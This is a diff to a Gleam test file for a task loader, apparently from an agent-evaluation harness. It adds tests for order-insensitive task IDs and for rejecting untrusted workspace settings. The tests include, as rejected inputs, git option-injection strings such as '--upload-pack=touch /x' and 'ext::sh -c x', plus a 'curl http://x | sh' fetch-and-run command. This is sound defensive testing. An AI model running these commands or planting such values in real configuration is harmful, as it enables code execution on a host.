@@ -24,7 +24,7 @@ fn mined() -> Task {
     name: "fix queue ordering",
     prompt: "Queue pops in the wrong order.",
     workspace: task.GitTree(
-      repository: "https://example.invalid/loom.git",
+      repository: "/srv/git/loom.git",
       commit:,
       tree:,
       prepare: [["gleam", "deps", "download"]],
@@ -420,4 +420,87 @@ pub fn task_load_refuses_edited_file_test() {
   assert string.starts_with(reason, "task content changed")
   let assert Error(missing) = task.load(directory <> "/absent.json")
   assert string.contains(missing, "cannot read")
+}
+
+pub fn task_id_ignores_set_order_test() {
+  let base = mined()
+  let assert task.Program(..) as verifier = base.verifier
+  let reordered =
+    task.Task(
+      ..base,
+      tags: list.reverse(base.tags),
+      verifier: task.Program(
+        ..verifier,
+        fail_to_pass: ["b.two", "a.one", "b.two"],
+        pass_to_pass: ["z.last", "y.first"],
+      ),
+    )
+  let expected =
+    task.Task(
+      ..base,
+      verifier: task.Program(
+        ..verifier,
+        fail_to_pass: ["a.one", "b.two"],
+        pass_to_pass: ["y.first", "z.last"],
+      ),
+    )
+
+  assert task.mint(reordered).id == task.mint(expected).id
+  assert task.decode(task.to_json(task.mint(reordered)))
+    == Ok(task.mint(expected))
+
+  // A file that repeats a member is refused rather than silently collapsed.
+  let doubled =
+    with_field(
+      task.to_json(base),
+      "tags",
+      json.Array([json.String("a"), json.String("a")]),
+    )
+  assert reason_for(doubled) == "repeated tag"
+  let repeated =
+    with_nested(
+      task.to_json(base),
+      "verifier",
+      "fail_to_pass",
+      json.Array([json.String("t"), json.String("t")]),
+    )
+  assert reason_for(repeated) == "repeated test id"
+}
+
+// Task files are untrusted: a Harbor import is someone else's file, and
+// `prepare` runs on the host outside the jail. These are the shapes that
+// would turn a task into a command or a git option.
+pub fn untrusted_task_cannot_name_host_commands_test() {
+  let base = task.to_json(mined())
+  let repository = fn(value) {
+    reason_for(with_nested(base, "workspace", "repository", json.String(value)))
+  }
+  let prepare = fn(argv) {
+    reason_for(with_nested(
+      base,
+      "workspace",
+      "prepare",
+      json.Array([json.Array(list.map(argv, json.String))]),
+    ))
+  }
+  let refused_repository =
+    "repository must be an absolute local path of at most 1024 bytes, with no option-like segment"
+
+  assert repository("/srv/git/loom.git") == "accepted"
+  assert repository("https://example.invalid/loom.git") == refused_repository
+  assert repository("--upload-pack=touch /x") == refused_repository
+  assert repository("/srv/-evil") == refused_repository
+  assert repository("/srv/ext::sh -c x") == refused_repository
+  assert repository("/srv/a\u{0}b") == refused_repository
+  assert repository("relative/path") == refused_repository
+  assert repository("/" <> string.repeat("a", 1024)) == refused_repository
+
+  assert prepare(["gleam", "deps", "download"]) == "accepted"
+  assert prepare(["gleam", "build"]) == "accepted"
+  assert prepare(["gleam", "build", "--warnings-as-errors"]) == "accepted"
+  assert prepare(["sh", "-c", "curl http://x | sh"])
+    == "prepare command not allowlisted"
+  assert prepare(["gleam", "run"]) == "prepare command not allowlisted"
+  assert prepare(["gleam", "build", "--target", "javascript"])
+    == "prepare command not allowlisted"
 }
